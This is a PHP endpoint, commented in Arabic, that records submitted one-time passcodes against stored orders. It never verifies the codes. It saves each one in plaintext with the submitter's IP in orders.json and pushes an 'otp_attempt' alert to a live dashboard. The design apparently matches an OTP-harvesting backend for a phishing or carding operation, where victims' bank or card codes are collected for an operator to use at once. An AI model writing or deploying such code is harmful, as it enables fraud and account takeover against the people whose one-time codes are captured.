<?php
/**
 * تسجيل محاولات إدخال OTP وربطها بطلب محفوظ في orders.json
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed'], JSON_UNESCAPED_UNICODE);
    exit;
}

try {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    if (!$data || empty($data['order_id'])) {
        throw new Exception('معرّف الطلب مفقود');
    }

    $orderId = (string) $data['order_id'];
    $code = isset($data['code']) ? preg_replace('/\D/', '', (string) $data['code']) : '';
    if ($code === '' || strlen($code) > 8) {
        throw new Exception('رمز غير صالح');
    }

    $ordersFile = __DIR__ . '/data/orders.json';
    if (!file_exists($ordersFile)) {
        throw new Exception('لا توجد طلبات');
    }

    $fp = fopen($ordersFile, 'c+');
    if ($fp === false) {
        throw new Exception('تعذّر فتح ملف الطلبات');
    }

    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        throw new Exception('تعذّر قفل الملف');
    }

    rewind($fp);
    $content = stream_get_contents($fp);
    $orders = json_decode($content, true);
    if (!is_array($orders)) {
        flock($fp, LOCK_UN);
        fclose($fp);
        throw new Exception('بيانات الطلبات تالفة');
    }

    $found = false;
    $attempt = [
        'code' => $code,
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    ];

    foreach ($orders as $i => &$order) {
        if (!is_array($order)) {
            continue;
        }
        if ((string) ($order['id'] ?? '') !== $orderId) {
            continue;
        }
        $found = true;
        if (!isset($order['otp_data']) || !is_array($order['otp_data'])) {
            $order['otp_data'] = [];
        }
        array_unshift($order['otp_data'], $attempt);
        break;
    }
    unset($order);

    if (!$found) {
        flock($fp, LOCK_UN);
        fclose($fp);
        http_response_code(404);
        echo json_encode(['success' => false, 'message' => 'الطلب غير موجود'], JSON_UNESCAPED_UNICODE);
        exit;
    }

    $json = json_encode($orders, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if ($json === false) {
        flock($fp, LOCK_UN);
        fclose($fp);
        throw new Exception('فشل تجهيز البيانات');
    }

    rewind($fp);
    ftruncate($fp, 0);
    $written = fwrite($fp, $json);
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);

    if ($written === false) {
        throw new Exception('فشل الحفظ');
    }

    if (is_file(__DIR__ . '/includes/farm_pusher_broadcast.php')) {
        require_once __DIR__ . '/includes/farm_pusher_broadcast.php';
        farm_pusher_broadcast('dashboard-event', [
            'kind' => 'otp_attempt',
            'order_id' => $orderId,
        ]);
        farm_pusher_broadcast('dashboard-event', ['kind' => 'orders_updated']);
    }

    echo json_encode([
        'success' => true,
        'message' => 'تم تسجيل المحاولة',
    ], JSON_UNESCAPED_UNICODE);
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
    ], JSON_UNESCAPED_UNICODE);
}
